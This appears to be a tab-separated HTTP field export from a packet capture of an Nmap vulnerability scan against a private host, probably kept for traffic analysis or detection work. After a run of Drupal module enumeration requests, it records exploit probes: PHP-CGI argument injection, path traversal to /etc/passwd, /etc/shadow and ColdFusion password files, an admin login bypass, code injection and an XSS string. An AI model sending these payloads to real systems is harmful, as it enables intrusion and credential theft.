http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	keep-alive,keep-alive,keep-alive,keep-alive,keep-alive,keep-alive,keep-alive										192.168.1.104,192.168.1.104,192.168.1.104,192.168.1.104,192.168.1.104,192.168.1.104,192.168.1.104									14014,14015,14015,14015,14015,14015,14015						1,1,1,1,1,1,1	http://192.168.1.104/sites/all/modules/job_scheduler/LICENSE.txt,http://192.168.1.104/sites/all/modules/menu_attributes/LICENSE.txt,http://192.168.1.104/sites/all/modules/redirect/LICENSE.txt,http://192.168.1.104/sites/all/modules/addressfield/LICENSE.txt,http://192.168.1.104/sites/all/modules/mailsystem/LICENSE.txt,http://192.168.1.104/sites/all/modules/nice_menus/LICENSE.txt,http://192.168.1.104/sites/all/modules/diff/LICENSE.txt		HEAD,HEAD,HEAD,HEAD,HEAD,HEAD,HEAD				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/sites/all/modules/job_scheduler/LICENSE.txt,/sites/all/modules/menu_attributes/LICENSE.txt,/sites/all/modules/redirect/LICENSE.txt,/sites/all/modules/addressfield/LICENSE.txt,/sites/all/modules/mailsystem/LICENSE.txt,/sites/all/modules/nice_menus/LICENSE.txt,/sites/all/modules/diff/LICENSE.txt
																	keep-alive,keep-alive,keep-alive,keep-alive,keep-alive,keep-alive,keep-alive										192.168.1.104,192.168.1.104,192.168.1.104,192.168.1.104,192.168.1.104,192.168.1.104,192.168.1.104									14015,14016,14016,14016,14016,14016,14016						1,1,1,1,1,1,1	http://192.168.1.104/sites/all/modules/flexslider/LICENSE.txt,http://192.168.1.104/sites/all/modules/taxonomy_menu/LICENSE.txt,http://192.168.1.104/sites/all/modules/file_entity/LICENSE.txt,http://192.168.1.104/sites/all/modules/feeds/LICENSE.txt,http://192.168.1.104/sites/all/modules/media_youtube/LICENSE.txt,http://192.168.1.104/sites/all/modules/node_clone/LICENSE.txt,http://192.168.1.104/sites/all/modules/admin_views/LICENSE.txt		HEAD,HEAD,HEAD,HEAD,HEAD,HEAD,HEAD				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/sites/all/modules/flexslider/LICENSE.txt,/sites/all/modules/taxonomy_menu/LICENSE.txt,/sites/all/modules/file_entity/LICENSE.txt,/sites/all/modules/feeds/LICENSE.txt,/sites/all/modules/media_youtube/LICENSE.txt,/sites/all/modules/node_clone/LICENSE.txt,/sites/all/modules/admin_views/LICENSE.txt
																	keep-alive,keep-alive,keep-alive,keep-alive,keep-alive,keep-alive,keep-alive,keep-alive										192.168.1.104,192.168.1.104,192.168.1.104,192.168.1.104,192.168.1.104,192.168.1.104,192.168.1.104,192.168.1.104									14016,14017,14017,14017,14017,14017,14017,14017						1,1,1,1,1,1,1,1	http://192.168.1.104/sites/all/modules/smtp/LICENSE.txt,http://192.168.1.104/sites/all/modules/special_menu_items/LICENSE.txt,http://192.168.1.104/sites/all/modules/auto_nodetitle/LICENSE.txt,http://192.168.1.104/sites/all/modules/jquery_ui/LICENSE.txt,http://192.168.1.104/sites/all/modules/insert/LICENSE.txt,http://192.168.1.104/sites/all/modules/cck/LICENSE.txt,http://192.168.1.104/sites/all/modules/quicktabs/LICENSE.txt,http://192.168.1.104/sites/all/modules/mimemail/LICENSE.txt		HEAD,HEAD,HEAD,HEAD,HEAD,HEAD,HEAD,HEAD				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/sites/all/modules/smtp/LICENSE.txt,/sites/all/modules/special_menu_items/LICENSE.txt,/sites/all/modules/auto_nodetitle/LICENSE.txt,/sites/all/modules/jquery_ui/LICENSE.txt,/sites/all/modules/insert/LICENSE.txt,/sites/all/modules/cck/LICENSE.txt,/sites/all/modules/quicktabs/LICENSE.txt,/sites/all/modules/mimemail/LICENSE.txt
																	keep-alive,keep-alive,keep-alive,keep-alive,keep-alive,keep-alive,keep-alive										192.168.1.104,192.168.1.104,192.168.1.104,192.168.1.104,192.168.1.104,192.168.1.104,192.168.1.104									14017,14018,14018,14018,14018,14018,14018						1,1,1,1,1,1,1	http://192.168.1.104/sites/all/modules/views_php/LICENSE.txt,http://192.168.1.104/sites/all/modules/content_access/LICENSE.txt,http://192.168.1.104/sites/all/modules/jcarousel/LICENSE.txt,http://192.168.1.104/sites/all/modules/print/LICENSE.txt,http://192.168.1.104/sites/all/modules/plupload/LICENSE.txt,http://192.168.1.104/sites/all/modules/votingapi/LICENSE.txt,http://192.168.1.104/sites/all/modules/poormanscron/LICENSE.txt		HEAD,HEAD,HEAD,HEAD,HEAD,HEAD,HEAD				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/sites/all/modules/views_php/LICENSE.txt,/sites/all/modules/content_access/LICENSE.txt,/sites/all/modules/jcarousel/LICENSE.txt,/sites/all/modules/print/LICENSE.txt,/sites/all/modules/plupload/LICENSE.txt,/sites/all/modules/votingapi/LICENSE.txt,/sites/all/modules/poormanscron/LICENSE.txt
																	keep-alive,keep-alive,keep-alive,keep-alive,keep-alive,keep-alive,keep-alive,keep-alive										192.168.1.104,192.168.1.104,192.168.1.104,192.168.1.104,192.168.1.104,192.168.1.104,192.168.1.104,192.168.1.104									14018,14019,14019,14019,14019,14019,14019,14019						1,1,1,1,1,1,1,1	http://192.168.1.104/sites/all/modules/simplenews/LICENSE.txt,http://192.168.1.104/sites/all/modules/filefield_sources/LICENSE.txt,http://192.168.1.104/sites/all/modules/extlink/LICENSE.txt,http://192.168.1.104/sites/all/modules/honeypot/LICENSE.txt,http://192.168.1.104/sites/all/modules/facetapi/LICENSE.txt,http://192.168.1.104/sites/all/modules/logintoboggan/LICENSE.txt,http://192.168.1.104/sites/all/modules/search_api/LICENSE.txt,http://192.168.1.104/sites/all/modules/uuid/LICENSE.txt		HEAD,HEAD,HEAD,HEAD,HEAD,HEAD,HEAD,HEAD				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/sites/all/modules/simplenews/LICENSE.txt,/sites/all/modules/filefield_sources/LICENSE.txt,/sites/all/modules/extlink/LICENSE.txt,/sites/all/modules/honeypot/LICENSE.txt,/sites/all/modules/facetapi/LICENSE.txt,/sites/all/modules/logintoboggan/LICENSE.txt,/sites/all/modules/search_api/LICENSE.txt,/sites/all/modules/uuid/LICENSE.txt
																	keep-alive,keep-alive,keep-alive,keep-alive,keep-alive,keep-alive,keep-alive										192.168.1.104,192.168.1.104,192.168.1.104,192.168.1.104,192.168.1.104,192.168.1.104,192.168.1.104									14019,14020,14020,14020,14020,14020,14020						1,1,1,1,1,1,1	http://192.168.1.104/sites/all/modules/commerce/LICENSE.txt,http://192.168.1.104/sites/all/modules/custom_breadcrumbs/LICENSE.txt,http://192.168.1.104/sites/all/modules/views_data_export/LICENSE.txt,http://192.168.1.104/sites/all/modules/oauth/LICENSE.txt,http://192.168.1.104/sites/all/modules/better_formats/LICENSE.txt,http://192.168.1.104/sites/all/modules/site_verify/LICENSE.txt,http://192.168.1.104/sites/all/modules/location/LICENSE.txt		HEAD,HEAD,HEAD,HEAD,HEAD,HEAD,HEAD				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/sites/all/modules/commerce/LICENSE.txt,/sites/all/modules/custom_breadcrumbs/LICENSE.txt,/sites/all/modules/views_data_export/LICENSE.txt,/sites/all/modules/oauth/LICENSE.txt,/sites/all/modules/better_formats/LICENSE.txt,/sites/all/modules/site_verify/LICENSE.txt,/sites/all/modules/location/LICENSE.txt
																	keep-alive,keep-alive,close										192.168.1.104,192.168.1.104,192.168.1.104									14020,14021,14021						1,1,1	http://192.168.1.104/sites/all/modules/fontyourface/LICENSE.txt,http://192.168.1.104/sites/all/modules/masquerade/LICENSE.txt,http://192.168.1.104/sites/all/modules/imce_mkdir/LICENSE.txt		HEAD,HEAD,HEAD				HTTP/1.1,HTTP/1.1,HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/sites/all/modules/fontyourface/LICENSE.txt,/sites/all/modules/masquerade/LICENSE.txt,/sites/all/modules/imce_mkdir/LICENSE.txt
																	close										192.168.1.104															1	http://192.168.1.104/axis2/services/listServices		GET				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/axis2/services/listServices
																	close		100	100	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/ulfvapqbrypy		POST				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/ulfvapqbrypy
																	close		86	86	application/xml						192.168.1.104															1	http://192.168.1.104/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/
																	close		52	52							192.168.1.104															1	http://192.168.1.104/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input		POST				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input
																	close										192.168.1.104															1	http://192.168.1.104/cgi-bin/mj_wwwusr?passw=&list=GLOBAL&user=&func=help&extra=/../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/cgi-bin/mj_wwwusr?passw=&list=GLOBAL&user=&func=help&extra=/../../../../../../../../etc/passwd
																	close										192.168.1.104															1	http://192.168.1.104/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/
																	close		774	774	application/x-amf						192.168.1.104															1	http://192.168.1.104/messagebroker/http		POST				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/messagebroker/http
																	close										192.168.1.104															1	http://192.168.1.104/nmaplowercheck1645204938		GET				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/nmaplowercheck1645204938
																	close										192.168.1.104															1	http://192.168.1.104/index.php		GET				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/index.php
																	close		515	515	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/?q=/user/login		POST				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/?q=/user/login
																	close										192.168.1.104															1	http://192.168.1.104//cmdownloads/?CMDsearch=%22.base64_decode%28%22ZGFjdHNtYWZocndtaGFw%22%29.%22		GET				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				//cmdownloads/?CMDsearch=%22.base64_decode%28%22ZGFjdHNtYWZocndtaGFw%22%29.%22
																	close										192.168.1.104															1	http://192.168.1.104/zimbra/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../dev/null%00		GET				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/zimbra/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../dev/null%00
																	close										192.168.1.104															1	http://192.168.1.104/index.php		GET				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/index.php
																	close										192.168.1.104															1	http://192.168.1.104/CFIDE/adminapi/administrator.cfc?method=login&adminpassword=&rdsPasswordAllowed=true		GET				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/CFIDE/adminapi/administrator.cfc?method=login&adminpassword=&rdsPasswordAllowed=true
																	close		105	105	application/xml						192.168.1.104															1	http://192.168.1.104/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/
																	close										192.168.1.104															1	http://192.168.1.104/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/analyzer/index.cfm&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp		GET				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/analyzer/index.cfm&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp
																	close		774	774	application/x-amf						192.168.1.104															1	http://192.168.1.104/messagebroker/httpsecure		POST				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/messagebroker/httpsecure
																	close										192.168.1.104															1	http://192.168.1.104/system/user/scn_user_list		GET				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/system/user/scn_user_list
																	close										192.168.1.104															1	http://192.168.1.104/help/../../etc/shadow		GET				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/help/../../etc/shadow
																	close										192.168.1.104														"><script>alert("XSS")</script><"	1	http://192.168.1.104/tlsovdtyzeeyiivz		GET				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/tlsovdtyzeeyiivz
																	close		100	100	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/phpMyAdmin-2.6.4-pl1/libraries/grab_globals.lib.php		POST				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/phpMyAdmin-2.6.4-pl1/libraries/grab_globals.lib.php
																	close		34	34							192.168.1.104															1	http://192.168.1.104/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input		POST				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input
																	close										192.168.1.104															1	http://192.168.1.104/noindex/css/open-sans.css		GET				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/noindex/css/open-sans.css
																	close										192.168.1.104															1	http://192.168.1.104/Listadeparametros.html		GET				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/Listadeparametros.html
																	close										192.168.1.104															1	http://192.168.1.104/zimbra/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/zimbra/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../etc/passwd%00
																	close										192.168.1.104															1	http://192.168.1.104/CFIDE/administrator/images/loginbackground.jpg		GET				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/CFIDE/administrator/images/loginbackground.jpg
																	close		774	774	application/x-amf						192.168.1.104															1	http://192.168.1.104/flex2gateway/http		POST				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/flex2gateway/http
																	close										192.168.1.104															1	http://192.168.1.104/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename=../../lib/password.properties&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp		GET				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename=../../lib/password.properties&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp
																	close										192.168.1.104															1	http://192.168.1.104/noindex/css/bootstrap.min.css		GET				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/noindex/css/bootstrap.min.css
																	close		774	774	application/x-amf						192.168.1.104															1	http://192.168.1.104/flex2gateway/httpsecure		POST				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/flex2gateway/httpsecure
																	close										192.168.1.104															1	http://192.168.1.104/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename=..\..\lib\password.properties&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp		GET				HTTP/1.1																			Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)				/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename=..\..\lib\password.properties&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp
